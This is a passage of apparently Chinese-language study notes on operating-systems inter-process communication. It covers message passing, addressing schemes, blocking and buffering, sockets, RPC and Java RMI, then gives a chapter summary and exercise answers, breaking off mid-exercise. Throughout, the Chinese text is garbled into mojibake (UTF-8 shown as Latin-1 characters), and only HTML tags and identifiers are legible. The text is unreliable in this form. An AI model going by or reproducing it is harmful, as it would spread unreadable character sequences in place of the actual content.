éœ€è¦é€šä¿¡çš„æ¯ä¸ªè¿›ç¨‹å¿…é¡»æ˜ç¡®åœ°å‘½åé€šä¿¡çš„æ¥æ”¶è€…æˆ–å‘é€è€…ã€‚é‡‡ç”¨è¿™ç§æ–¹æ¡ˆï¼Œ åŸè¯­send()å’Œreceive()å®šä¹‰å¦‚ä¸‹ï¼š</p><ul><li>send(P,messageï¼‰ï¼šå‘é€æ¶ˆæ¯åˆ°è¿›ç¨‹Pã€‚</li><li>receive(Q, messageï¼‰ï¼š æ¥æ”¶æ¥è‡ªè¿›ç¨‹Qçš„æ¶ˆæ¯ã€‚</li></ul><p>è¿™ç§æ–¹æ¡ˆçš„é€šä¿¡çº¿è·¯å…·æœ‰å¦‚ä¸‹å±æ€§ï¼š</p><ul><li>åœ¨éœ€è¦é€šä¿¡çš„æ¯å¯¹è¿›ç¨‹ä¹‹é—´è‡ªåŠ¨å»ºç«‹çº¿è·¯ã€‚è¿›ç¨‹ä»…éœ€çŸ¥é“ç›¸äº’é€šä¿¡çš„æ ‡è¯†ç¬¦ã€‚</li><li>ä¸€ä¸ªçº¿è·¯åªä¸ä¸¤ä¸ªè¿›ç¨‹ç›¸å…³ã€‚</li><li>æ¯å¯¹è¿›ç¨‹ä¹‹é—´åªæœ‰ä¸€ä¸ªçº¿è·¯ã€‚</li></ul><p>è¿™ç§æ–¹æ¡ˆå±•ç¤ºäº†<strong>å¯¹ç§°å¯»å€</strong>ï¼Œ å³å‘é€å’Œæ¥æ”¶è¿›ç¨‹å¿…é¡»å‘½åå¯¹æ–¹ä»¥ä¾¿é€šä¿¡ã€‚</p><p>è¿™ç§æ–¹æ¡ˆä¸€ä¸ªå˜å½¢é‡‡ç”¨<strong>éå¯¹ç§°å¯»å€</strong>ï¼Œ å³åªè¦å‘é€è€…å‘½åæ¥æ”¶è€…ï¼Œ è€Œæ¥æ”¶è€…ä¸éœ€è¦å‘½åå‘é€è€…ã€‚é‡‡ç”¨è¿™ç§æ–¹æ¡ˆï¼Œ åŸè¯­send()å’Œreceive()å®šä¹‰å¦‚ä¸‹ï¼š</p><ul><li>send(P,messageï¼‰ï¼šå‘é€æ¶ˆæ¯åˆ°è¿›ç¨‹Pã€‚</li><li>receive(id, messageï¼‰ï¼šæ¥æ”¶æ¥è‡ªä»»ä½•è¿›ç¨‹çš„æ¶ˆæ¯ï¼Œå˜é‡idè®¾ç½®æˆä¸å…¶é€šä¿¡çš„è¿›ç¨‹åç§°ã€‚</li></ul><p>å¯¹ç§°å’Œéå¯¹ç§°å¯»å€æ–¹æ¡ˆçš„<strong>ç¼ºç‚¹</strong></p><ul><li>æ˜¯é™åˆ¶äº†è¿›ç¨‹å®šä¹‰çš„æ¨¡å—åŒ–ã€‚æ”¹å˜è¿›ç¨‹çš„åç§°å¯èƒ½å¿…é¡»æ£€æŸ¥æ‰€æœ‰å…¶ä»–è¿›ç¨‹å®šä¹‰ã€‚æ‰€æœ‰æ—§åç§°çš„å¼•ç”¨éƒ½å¿…é¡»æ‰¾åˆ°ï¼Œ ä»¥ä¾¿ä¿®æ”¹æˆä¸ºæ–°åç§°ã€‚</li><li>æœ‰å¯èƒ½é€ æˆä¾èµ–äºç‰¹å®šçš„æ“ä½œç³»ç»Ÿï¼Œå› ä¸ºä¸åŒæ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹çš„IDå·çš„æŒ‡å®šæ–¹å¼å¯èƒ½ä¸ä¸€è‡´ï¼›</li><li>æ¯å¯¹è¿›ç¨‹é—´åªèƒ½å¤Ÿå»ºç«‹ä¸€æ¡é“¾è·¯æ˜¯ä¸€ä¸ªé‡å¤§çš„ç¼ºé™·ã€‚</li></ul><p><strong>é—´æ¥é€šä¿¡</strong>:</p><p>åœ¨<strong>é—´æ¥é€šä¿¡</strong>ä¸­ï¼Œ é€šè¿‡é‚®ç®±æˆ–ç«¯å£æ¥å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚é‚®ç®±å¯ä»¥æŠ½è±¡æˆä¸€ä¸ªå¯¹è±¡ï¼Œ è¿›ç¨‹å¯ä»¥å‘å…¶ä¸­å­˜æ”¾æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»ä¸­åˆ é™¤æ¶ˆæ¯ï¼Œæ¯ä¸ªé‚®ç®±éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ã€‚ä¾‹å¦‚ï¼ŒPOSIXæ¶ˆæ¯é˜Ÿåˆ—é‡‡ç”¨ä¸€ä¸ªæ•´æ•°å€¼æ¥æ ‡è¯†ä¸€ä¸ªé‚®ç®±ã€‚å¯¹äºè¿™ç§æ–¹æ¡ˆï¼Œ ä¸€ä¸ªè¿›ç¨‹å¯èƒ½é€šè¿‡è®¸å¤šä¸åŒçš„é‚®ç®±ä¸å…¶ä»–è¿›ç¨‹é€šä¿¡ï¼Œ ä½†ä¸¤ä¸ªè¿›ç¨‹ä»…åœ¨å…¶å…±äº«è‡³å°‘ä¸€ä¸ªé‚®ç®±æ—¶å¯ç›¸äº’é€šä¿¡ã€‚åŸè¯­send()å’Œreceive()å®šä¹‰å¦‚ä¸‹ï¼š</p><ul><li>send(A , messageï¼‰ï¼šå‘é€ä¸€ä¸ªæ¶ˆæ¯åˆ°é‚®ç®±Aã€‚</li><li>receive(A, messageï¼‰ï¼š æ¥æ”¶æ¥è‡ªé‚®ç®±A çš„æ¶ˆæ¯ã€‚</li></ul><p>å¯¹äºè¿™ç§æ–¹æ¡ˆï¼Œ é€šä¿¡çº¿è·¯å…·æœ‰å¦‚ä¸‹å±æ€§ï¼š</p><ul><li>åªæœ‰åœ¨ä¸¤ä¸ªè¿›ç¨‹å…±äº«ä¸€ä¸ªé‚®ç®±æ—¶ï¼Œ æ‰èƒ½å»ºç«‹é€šä¿¡çº¿è·¯ã€‚</li><li>ä¸€ä¸ªçº¿è·¯å¯ä»¥ä¸ä¸¤ä¸ªæˆ–æ›´å¤šçš„è¿›ç¨‹ç›¸å…³è”ã€‚</li><li>ä¸¤ä¸ªé€šä¿¡è¿›ç¨‹ä¹‹é—´å¯æœ‰å¤šä¸ªä¸åŒçš„çº¿è·¯ï¼Œ æ¯ä¸ªçº¿è·¯å¯¹åº”äºä¸€ä¸ªé‚®ç®±ã€‚</li></ul></li><li><p><strong>åŒæ­¥</strong></p><p>è¿›ç¨‹é—´çš„é€šä¿¡å¯ä»¥é€šè¿‡è°ƒç”¨åŸè¯­sendï¼ˆï¼‰å’ŒreceiveOæ¥è¿›è¡Œã€‚è¿™äº›åŸè¯­çš„å®ç°æœ‰ä¸åŒçš„è®¾è®¡é€‰é¡¹ã€‚æ¶ˆæ¯ä¼ é€’å¯ä»¥æ˜¯é˜»å¡æˆ–éé˜»å¡ä¸€ä¸€ä¸€ä¹Ÿç§°ä¸ºåŒæ­¥æˆ–å¼‚æ­¥ã€‚</p><ul><li>é˜»å¡sendï¼šå‘é€è¿›ç¨‹é˜»å¡ï¼Œç›´åˆ°æ¶ˆæ¯è¢«æ¥æ”¶è¿›ç¨‹æˆ–é‚®ç®±æ‰€æ¥æ”¶ã€‚</li><li>éé˜»å¡sendï¼šå‘é€è¿›ç¨‹å‘é€æ¶ˆæ¯å¹¶å†ç»§ç»­æ“ä½œã€‚</li><li>é˜»å¡receiveï¼šæ¥æ”¶è€…é˜»å¡ï¼Œç›´åˆ°æœ‰æ¶ˆæ¯å¯ç”¨ã€‚</li><li>éé˜»å¡receiveï¼šæ¥æ”¶è€…æ”¶åˆ°ä¸€ä¸ªæœ‰æ•ˆæ¶ˆæ¯æˆ–ç©ºæ¶ˆæ¯ã€‚</li></ul><p>sendï¼ˆï¼‰å’Œreceiveï¼ˆï¼‰å¯ä»¥è¿›è¡Œå¤šç§ç»„åˆã€‚å½“sendï¼ˆï¼‰å’Œreceiveï¼ˆï¼‰éƒ½é˜»å¡æ—¶ï¼Œåˆ™åœ¨å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´å°±æœ‰ä¸€ä¸ªé›†åˆç‚¹ï¼ˆrendezvousï¼‰ã€‚å½“ä½¿ç”¨é˜»å¡sendOå’Œreceive(ï¼‰æ—¶ï¼Œå¦‚ä½•è§£å†³ç”Ÿäº§è€…ï¼æ¶ˆè´¹è€…é—®é¢˜å°±ä¸å†é‡è¦äº†ã€‚ç”Ÿäº§è€…ä»…éœ€è°ƒç”¨é˜»å¡sendï¼ˆï¼‰è°ƒç”¨å¹¶ç­‰å¾…ï¼Œç›´åˆ°æ¶ˆæ¯è¢«é€åˆ°æ¥æ”¶è€…æˆ–é‚®ç®±ã€‚åŒæ ·åœ°ï¼Œå½“æ¶ˆè´¹è€…è°ƒç”¨receiveï¼ˆï¼‰æ—¶ï¼Œå‘ç”Ÿé˜»å¡ç›´åˆ°æœ‰ä¸€ä¸ªæ¶ˆæ¯å¯ç”¨ã€‚</p></li><li><p><strong>ç¼“å†²</strong></p><p>ä¸ç®¡é€šä¿¡æ˜¯ç›´æ¥çš„æˆ–æ˜¯é—´æ¥çš„ï¼Œ é€šä¿¡è¿›ç¨‹æ‰€äº¤æ¢çš„æ¶ˆæ¯éƒ½é©»ç•™åœ¨ä¸´æ—¶é˜Ÿåˆ—ä¸­ã€‚ç®€å•åœ°è®²ï¼Œ é˜Ÿåˆ—å®ç°æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><ul><li>é›¶å®¹é‡ï¼šé˜Ÿåˆ—çš„æœ€å¤§é•¿åº¦ä¸º0ï¼šå› æ­¤ï¼Œ çº¿è·¯ä¸­ä¸èƒ½æœ‰ä»»ä½•æ¶ˆæ¯å¤„äºç­‰å¾…ã€‚å¯¹äºè¿™ç§<br>æƒ…å†µï¼Œ å¿…é¡»é˜»å¡å‘é€ï¼Œ ç›´åˆ°æ¥æ”¶è€…æ¥æ”¶åˆ°æ¶ˆæ¯ã€‚</li><li>æœ‰é™å®¹é‡ï¼šé˜Ÿåˆ—çš„é•¿åº¦ä¸ºæœ‰é™çš„nï¼š å› æ­¤ï¼Œ æœ€å¤šåªèƒ½æœ‰nä¸ªæ¶ˆæ¯é©»ç•™å…¶ä¸­ã€‚å¦‚æœåœ¨å‘é€æ–°æ¶ˆæ¯æ—¶é˜Ÿåˆ—æœªæ»¡ï¼Œé‚£ä¹ˆè¯¥æ¶ˆæ¯å¯ä»¥æ”¾åœ¨é˜Ÿåˆ—ä¸­ï¼ˆæˆ–è€…å¤åˆ¶æ¶ˆæ¯æˆ–è€…ä¿å­˜æ¶ˆæ¯çš„æŒ‡é’ˆï¼‰ï¼Œä¸”å‘é€è€…å¯ç»§ç»­æ‰§è¡Œè€Œä¸å¿…ç­‰å¾…ã€‚ä¸è¿‡ï¼Œ çº¿è·¯å®¹é‡æœ‰é™ã€‚å¦‚æœçº¿è·¯æ»¡ï¼Œ å¿…é¡»é˜»å¡å‘é€è€…ç›´åˆ°é˜Ÿåˆ—ä¸­çš„ç©ºé—´å¯ç”¨ä¸ºæ­¢ã€‚</li><li>æ— é™å®¹é‡ï¼šé˜Ÿåˆ—é•¿åº¦å¯ä»¥æ— é™ï¼Œå› æ­¤ï¼Œ ä¸ç®¡å¤šå°‘æ¶ˆæ¯éƒ½å¯åœ¨å…¶ä¸­ç­‰å¾…ï¼Œ ä»ä¸é˜»å¡å‘é€è€…ã€‚</li></ul><p>é›¶å®¹é‡æƒ…å†µç§°ä¸ºæ²¡æœ‰ç¼“å†²çš„æ¶ˆæ¯ç³»ç»Ÿï¼Œ å…¶ä»–æƒ…å†µç§°ä¸ºè‡ªåŠ¨ç¼“å†²ã€‚</p></li></ol><h2 id="35-å®¢æˆ·æœºæœåŠ¡å™¨ç³»ç»Ÿé€šä¿¡"><a class="markdownIt-Anchor" href="#35-å®¢æˆ·æœºæœåŠ¡å™¨ç³»ç»Ÿé€šä¿¡"></a> 3.5 å®¢æˆ·æœºæœåŠ¡å™¨ç³»ç»Ÿé€šä¿¡</h2><h3 id="351-socket"><a class="markdownIt-Anchor" href="#351-socket"></a> 3.5.1 Socket</h3><p><strong>Socket</strong> ï¼ˆå¥—æ¥å­—ã€‰å¯å®šä¹‰ä¸ºé€šä¿¡çš„ç«¯ç‚¹ã€‚ä¸€å¯¹é€šè¿‡ç½‘ç»œé€šä¿¡çš„è¿›ç¨‹éœ€è¦ä½¿ç”¨ä¸€å¯¹Socketä¸€ä¸€å³æ¯ä¸ªè¿›ç¨‹å„æœ‰ä¸€ä¸ªã€‚</p><p>Socket ç”±IP åœ°å€ä¸ä¸€ä¸ªç«¯å£å·è¿æ¥ç»„æˆã€‚é€šå¸¸ï¼Œ Socketé‡‡ç”¨å®¢æˆ·æœºä¸€æœåŠ¡å™¨ç»“æ„ã€‚æœåŠ¡å™¨é€šè¿‡ç›‘æ˜•æŒ‡å®šç«¯å£æ¥ç­‰å¾…è¿›æ¥çš„å®¢æˆ·è¯·æ±‚ã€‚ä¸€æ—¦æ”¶åˆ°è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°±æ¥å—æ¥è‡ªå®¢æˆ·Socket çš„è¿æ¥ï¼Œ ä»è€Œå®Œæˆè¿æ¥ã€‚</p><p>Javaæä¾›äº†ä¸‰ç§ä¸åŒç±»å‹çš„Socketã€‚</p><ul><li>é¢å‘è¿æ¥ï¼ˆTCP) Socketæ˜¯ç”¨Socketç±»å®ç°çš„ã€‚</li><li>æ— è¿æ¥ï¼ˆUDP) Socket ä½¿ç”¨äº†DatagramSocket ç±»ã€‚</li><li>æœ€åä¸€ç§ç±»å‹æ˜¯å¤šç‚¹ä¼ é€Socket ç±»(MulticastSocket classï¼‰ï¼Œ å®ƒæ˜¯DatagramSocketç±»çš„å­ç±»ã€‚å¤šç‚¹ä¼ é€Socketå…è®¸æ•°æ®å‘é€ç»™å¤šä¸ªæ¥æ”¶è€…ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20211114161059376.png" alt="image-20211114161059376"></p><p><img src="/posts/8ce3e425/image-20211114161112895.png" alt="image-20211114161112895"></p><p>æ— è®ºä¸€ä¸ªSocketé€šä¿¡ç¨‹åºçš„åŠŸèƒ½å¤šä¹ˆé½å…¨ã€ç¨‹åºå¤šä¹ˆå¤æ‚ï¼Œå…¶åŸºæœ¬ç»“æ„éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½åŒ…æ‹¬ä»¥ä¸‹å››ä¸ªåŸºæœ¬æ­¥éª¤ï¼š</p><ol><li>åœ¨å®¢æˆ·æ–¹å’ŒæœåŠ¡å™¨æ–¹åˆ›å»ºSocket/ServerSocketå®ä¾‹ã€‚</li><li>æ‰“å¼€è¿æ¥åˆ°Socketçš„è¾“å…¥/è¾“å‡ºæµã€‚</li><li>åˆ©ç”¨è¾“å…¥/è¾“å‡ºæµï¼ŒæŒ‰ç…§ä¸€å®šçš„åè®®å¯¹Socketè¿›è¡Œè¯»/å†™æ“ä½œã€‚</li><li>å…³é—­è¾“å…¥/è¾“å‡ºæµå’ŒSocketã€‚//å¦‚æœç½‘ç»œçš„ä¸€ç«¯å·²ç»å…³é—­ï¼Œå¦ä¸€ç«¯è¯»åˆ°null</li></ol><p>é€šå¸¸ï¼Œç¨‹åºå‘˜çš„ä¸»è¦å·¥ä½œæ˜¯é’ˆå¯¹æ‰€è¦å®Œæˆçš„åŠŸèƒ½åœ¨ç¬¬3æ­¥è¿›è¡Œç¼–ç¨‹ï¼Œç¬¬1ã€2ã€4æ­¥å¯¹æ‰€æœ‰çš„é€šä¿¡ç¨‹åºæ¥è¯´å‡ ä¹éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p>æœ‰è¿æ¥ï¼š</p><p><img src="/posts/8ce3e425/image-20211114162712864.png" alt="image-20211114162712864"></p><p>æ— è¿æ¥ï¼š</p><p><img src="/posts/8ce3e425/image-20211114162726368.png" alt="image-20211114162726368"></p><h3 id="352-è¿œç¨‹è¿‡ç¨‹è°ƒç”¨"><a class="markdownIt-Anchor" href="#352-è¿œç¨‹è¿‡ç¨‹è°ƒç”¨"></a> 3.5.2 è¿œç¨‹è¿‡ç¨‹è°ƒç”¨</h3><p><img src="/posts/8ce3e425/image-20211114162954112.png" alt="image-20211114162954112"></p><h3 id="353-è¿œç¨‹æ–¹æ³•è°ƒç”¨"><a class="markdownIt-Anchor" href="#353-è¿œç¨‹æ–¹æ³•è°ƒç”¨"></a> 3.5.3 è¿œç¨‹æ–¹æ³•è°ƒç”¨</h3><p>è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆremote method invocation, RMIï¼‰ æ˜¯ä¸€ä¸ªç±»ä¼¼äºRPC çš„Java ç‰¹æ€§ã€‚RMIå…è®¸çº¿ç¨‹è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ã€‚å¦‚æœå¯¹è±¡ä½äºä¸åŒçš„JVM ä¸Šï¼Œé‚£ä¹ˆå°±è®¤ä¸ºå®ƒæ˜¯è¿œç¨‹çš„ã€‚å› æ­¤ï¼Œ è¿œç¨‹å¯èƒ½åœ¨åŒä¸€è®¡ç®—æœºæˆ–é€šè¿‡ç½‘ç»œè¿æ¥çš„ä¸»æœºçš„ä¸åŒJVM ä¸Šã€‚è¿™ç§æƒ…å†µå¦‚å›¾3.22æ‰€ç¤ºã€‚</p><p><img src="/posts/8ce3e425/image-20211114163017447-16417053527271.png" alt></p><h2 id="36-å°ç»“"><a class="markdownIt-Anchor" href="#36-å°ç»“"></a> 3.6 å°ç»“</h2><p>è¿›ç¨‹æ˜¯æ‰§è¡Œä¸­çš„ç¨‹åºã€‚éšç€è¿›ç¨‹çš„æ‰§è¡Œï¼Œ å®ƒæ”¹å˜çŠ¶æ€ã€‚è¿›ç¨‹çŠ¶æ€ç”±è¿›ç¨‹å½“å‰æ´»åŠ¨æ‰€å®šä¹‰ã€‚æ¯ä¸ªè¿›ç¨‹å¯å¤„äºï¼š <strong>æ–°çš„ã€å°±ç»ªã€è¿è¡Œã€ç­‰å¾…æˆ–ç»ˆæ­¢</strong>ç­‰çŠ¶æ€ã€‚æ¯ä¸ªè¿›ç¨‹åœ¨æ“ä½œç³»ç»Ÿå†…é€šè¿‡è‡ªå·±çš„**è¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰**æ¥è¡¨ç¤ºã€‚</p><p>å½“å‰ä¸åœ¨æ‰§è¡Œçš„è¿›ç¨‹ä¼šæ”¾åœ¨æŸä¸ªç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚æ“ä½œç³»ç»Ÿæœ‰ä¸¤ç§ä¸»è¦é˜Ÿåˆ—ï¼š<strong>I/Oè¯·æ±‚é˜Ÿåˆ—</strong>å’Œ<strong>å°±ç»ªé˜Ÿåˆ—</strong>ã€‚å°±ç»ªé˜Ÿåˆ—åŒ…æ‹¬æ‰€æœ‰å‡†å¤‡æ‰§è¡Œå¹¶ç­‰å¾…CPUçš„è¿›ç¨‹ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰PCB , PCBé“¾æ¥èµ·æ¥å°±å½¢æˆäº†å°±ç»ªé˜Ÿåˆ—ã€‚é•¿æœŸï¼ˆä½œä¸šï¼‰è°ƒåº¦é€šè¿‡é€‰æ‹©è¿›ç¨‹æ¥äº‰ç”¨CPUã€‚é€šå¸¸ï¼Œ <strong>é•¿æœŸè°ƒåº¦</strong>ä¼šå—èµ„æºåˆ†é…è€ƒè™‘ï¼Œ å°¤å…¶æ˜¯å†…å­˜ç®¡ç†çš„å½±å“ã€‚<strong>çŸ­æœŸè°ƒåº¦</strong>ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰æ‹©è¿›ç¨‹ã€‚æ“ä½œç³»ç»Ÿå¿…é¡»ä¸ºçˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹æä¾›ä¸€ç§æœºåˆ¶ã€‚çˆ¶è¿›ç¨‹åœ¨ç»§ç»­ä¹‹å‰å¯ä»¥ç­‰å¾…å®ƒçš„å­è¿›ç¨‹ç»ˆæ­¢ï¼Œ ä¹Ÿå¯ä»¥å¹¶å‘æ‰§è¡Œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ã€‚å¹¶å‘æ‰§è¡Œæœ‰è®¸å¤šä¼˜ç‚¹ï¼Œ ä¾‹å¦‚ä¿¡æ¯å…±äº«ã€æé«˜è¿ç®—é€Ÿåº¦ã€æ¨¡å—åŒ–å’Œä¾¿åˆ©æ€§ç­‰ã€‚</p><p>æ“ä½œç³»ç»Ÿçš„æ‰§è¡Œè¿›ç¨‹å¯ä»¥æ˜¯ç‹¬ç«‹è¿›ç¨‹æˆ–åä½œè¿›ç¨‹ã€‚åä½œè¿›ç¨‹éœ€è¦è¿›ç¨‹é—´æœ‰äº’ç›¸é€šä¿¡çš„æœºåˆ¶ã€‚ä¸»è¦æœ‰ä¸¤ç§å½¢å¼çš„é€šä¿¡ï¼š <strong>å…±äº«å†…å­˜å’Œæ¶ˆæ¯ç³»ç»Ÿ</strong>ã€‚å…±äº«å†…å­˜æ–¹æ³•è¦æ±‚é€šä¿¡è¿›ç¨‹å…±äº«ä¸€äº›å˜é‡ã€‚è¿›ç¨‹é€šè¿‡ä½¿ç”¨è¿™äº›å…±äº«å˜é‡æ¥äº¤æ¢ä¿¡æ¯ã€‚å¯¹äº<strong>å…±äº«å†…å­˜ç³»ç»Ÿ</strong>ï¼Œ ä¸»è¦ç”±åº”ç”¨ç¨‹åºå‘˜æä¾›é€šä¿¡ï¼Œ æ“ä½œç³»ç»Ÿåªéœ€è¦æä¾›å…±äº«å†…å­˜ã€‚<strong>æ¶ˆæ¯ç³»ç»Ÿæ–¹æ³•</strong>å…è®¸è¿›ç¨‹äº¤æ¢ä¿¡æ¯ã€‚æä¾›é€šä¿¡çš„ä¸»è¦è´£ä»»åœ¨äºæ“ä½œç³»ç»Ÿæœ¬èº«ã€‚è¿™ä¸¤ç§æ–¹æ³•å¹¶ä¸äº’ç›¸æ’æ–¥ï¼Œ èƒ½åœ¨åŒä¸€æ“ä½œç³»ç»Ÿå†…åŒæ—¶å®ç°ã€‚</p><p>å®¢æˆ·æœºä¸€æœåŠ¡å™¨ç³»ç»Ÿä¸­çš„é€šä¿¡å¯èƒ½ä½¿ç”¨ï¼š</p><p>(1) <strong>Socket</strong>,(2) <strong>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)</strong>,(3) <strong>Javaçš„è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰</strong>ã€‚</p><p>Socketå®šä¹‰ä¸ºé€šä¿¡çš„ç«¯ç‚¹ã€‚ä¸€å¯¹åº”ç”¨ç¨‹åºé—´çš„è¿æ¥ç”±ä¸€å¯¹Socketç»„æˆï¼Œæ¯ç«¯å„æœ‰ä¸€ä¸ªé€šä¿¡é¢‘é“ã€‚RPC æ˜¯å¦ä¸€ç§å½¢å¼çš„åˆ†å¸ƒå¼é€šä¿¡ã€‚å½“ä¸€ä¸ªè¿›ç¨‹ï¼ˆæˆ–çº¿ç¨‹ï¼‰ è°ƒç”¨ä¸€ä¸ªè¿œç¨‹åº”ç”¨çš„æ–¹æ³•æ—¶ï¼Œ å°±å‡ºç°äº†RPCã€‚RMIæ˜¯RPC çš„Javaç‰ˆã€‚RMIå…è®¸çº¿ç¨‹å¦‚åŒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·æ¥è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ã€‚RPC å’ŒRMIçš„ä¸»è¦åŒºåˆ«æ˜¯RPCä¼ é€’ç»™è¿œç¨‹è¿‡ç¨‹çš„æ•°æ®æ˜¯æŒ‰æ™®é€šæ•°æ®ç»“æ„å½¢å¼çš„ï¼Œ è€ŒRMIå…è®¸æŠŠå¯¹è±¡ä¼ é€’ç»™è¿œç¨‹æ–¹æ³•ã€‚</p><h2 id="37-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#37-ä¹ é¢˜"></a> 3.7 ä¹ é¢˜</h2><p><strong>1.ä»€ä¹ˆæ˜¯å¤šé“ç¨‹åºçš„åº¦ï¼ˆdegree of multiprogrammingï¼‰ï¼Œå®ƒçš„ä¸Šé™ç”±å“ªäº›å› ç´ ç¡®å®šï¼Ÿ</strong></p><blockquote><p>å¤šé“å³è®¡ç®—æœºå†…å­˜ä¸­åŒæ—¶å­˜æ”¾å‡ é“ç›¸äº’ç‹¬ç«‹çš„ç¨‹åºã€‚å¤šé“ç¨‹åºçš„åº¦å°±æ˜¯æ“ä½œç³»ç»Ÿå°†å¤šå°‘ä¸ªè¿›ç¨‹æ”¾å…¥äº†å†…å­˜ã€‚ä¸Šé™çš„é™åˆ¶å› ç´ æœ‰CPUçš„æ ¸æ•°ã€æ‰€é‡‡ç”¨çš„çš„è°ƒåº¦ç®—æ³•ã€å†…å­˜çš„å¤§å°ç­‰ã€‚</p></blockquote><p><strong>3.1 è®ºè¿°é•¿æœŸã€ä¸­æœŸã€çŸ­æœŸè°ƒåº¦ä¹‹é—´çš„åŒºåˆ«ã€‚</strong></p><blockquote><p>a.<strong>çŸ­æœŸè°ƒåº¦</strong>ï¼šä»å‡†å¤‡æ‰§è¡Œçš„è¿›ç¨‹ä¸­é€‰æ‹©è¿›ç¨‹ï¼Œ å¹¶ä¸ºä¹‹åˆ†é…CPUã€‚<br>b.<strong>ä¸­æœŸè°ƒåº¦</strong>ï¼šä½œä¸ºä¸€ç§ä¸­ç­‰ç¨‹åº¦çš„è°ƒåº¦ç¨‹åºï¼Œå°¤å…¶è¢«ç”¨äºåˆ†æ—¶ç³»ç»Ÿï¼Œä¸€ä¸ªäº¤æ¢æ–¹æ¡ˆçš„å®æ–½ï¼Œå°†éƒ¨åˆ†è¿è¡Œç¨‹åºç§»å‡ºå†…å­˜ï¼Œä¹‹åï¼Œä»ä¸­æ–­å¤„ç»§ç»­æ‰§è¡Œã€‚<br>c.<strong>é•¿æœŸè°ƒåº¦</strong>ï¼ˆä½œä¸šè°ƒåº¦ç¨‹åºï¼‰ï¼šé€šå¸¸å¯¹äºæ‰¹å¤„ç†ç³»ç»Ÿï¼Œ è¿›ç¨‹æ›´å¤šåœ°æ˜¯è¢«æäº¤ï¼Œ è€Œä¸æ˜¯é©¬ä¸Šæ‰§è¡Œã€‚è¿™äº›è¿›ç¨‹è¢«æ”¾åˆ°å¤§å®¹é‡å­˜å‚¨è®¾å¤‡ï¼ˆé€šå¸¸ä¸ºç£ç›˜ï¼‰çš„ç¼“å†²æ± ä¸­ï¼Œä¿å­˜åœ¨é‚£é‡Œä»¥ä¾¿ä»¥åæ‰§è¡Œã€‚é•¿æœŸè°ƒåº¦ç¨‹åºä»ç¼“å†²æ± ä¸­é€‰æ‹©è¿›ç¨‹ï¼Œ å¹¶è£…å…¥å†…å­˜ä»¥å‡†å¤‡æ‰§è¡Œã€‚</p><p>å®ƒä»¬ä¸»è¦çš„<strong>ä¸åŒä¹‹å¤„</strong>æ˜¯å®ƒä»¬çš„æ‰§è¡Œçš„é¢‘ç‡ã€‚çŸ­æœŸè°ƒåº¦å¿…é¡»ç»å¸¸è°ƒç”¨ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œç”±äºåœ¨ç³»ç»Ÿä¸­ï¼Œé•¿æœŸè°ƒåº¦å¤„ç†ç§»åŠ¨çš„ä½œä¸šæ—¶ï¼Œå¹¶ä¸é¢‘ç¹è¢«è°ƒç”¨ï¼Œå¯èƒ½åœ¨è¿›ç¨‹ç¦»å¼€ç³»ç»Ÿæ—¶æ‰è¢«å”¤èµ·ã€‚</p></blockquote><p><strong>3.2 æè¿°å†…æ ¸åœ¨ä¸¤ä¸ªè¿›ç¨‹é—´è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„è¿‡ç¨‹ã€‚</strong></p><blockquote><p>è¿›ç¨‹ä¸Šä¸‹æ–‡æ˜¯ç”±è¿›ç¨‹çš„PCBæ¥è¡¨ç¤ºçš„ï¼Œå®ƒåŒ…æ‹¬CPUå¯„å­˜å™¨çš„å€¼å’Œå†…å­˜ç®¡ç†ä¿¡æ¯ç­‰ã€‚</p><p>é€šå¸¸ï¼Œé€šè¿‡æ‰§è¡Œä¸€ä¸ªçŠ¶æ€ä¿å­˜ï¼ˆ state saveï¼‰ æ¥ä¿å­˜CPUå½“å‰çŠ¶æ€ï¼ˆä¸ç®¡å®ƒæ˜¯å†…æ ¸æ¨¡å¼è¿˜æ˜¯ç”¨æˆ·æ¨¡å¼ï¼‰ï¼Œ ä¹‹åæ‰§è¡Œä¸€ä¸ªçŠ¶æ€æ¢å¤ï¼ˆ state restoreï¼‰é‡æ–°å¼€å§‹è¿è¡Œã€‚</p><p>å½“å‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶ï¼Œ å†…æ ¸ä¼šå°†æ—§è¿›ç¨‹çš„çŠ¶æ€ä¿å­˜åœ¨å…¶PCBä¸­ï¼Œç„¶åè£…å…¥ç»è°ƒåº¦è¦æ‰§è¡Œçš„å¹¶å·±ä¿å­˜çš„æ–°è¿›ç¨‹çš„ä¸Šä¸‹æ–‡</p></blockquote><p><strong>3.5 ä¸‹é¢è®¾è®¡çš„å¥½å¤„å’Œåå¤„åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿç³»ç»Ÿå±‚æ¬¡å’Œç”¨æˆ·å±‚æ¬¡éƒ½è¦è€ƒè™‘åˆ°</strong>ï¼<br>Aï¼Œå¯¹ç§°å’Œéå¯¹ç§°é€šä¿¡</p><p>Bï¼Œè‡ªåŠ¨å’Œæ˜¾å¼ç¼“å†²</p><p>Cï¼Œ 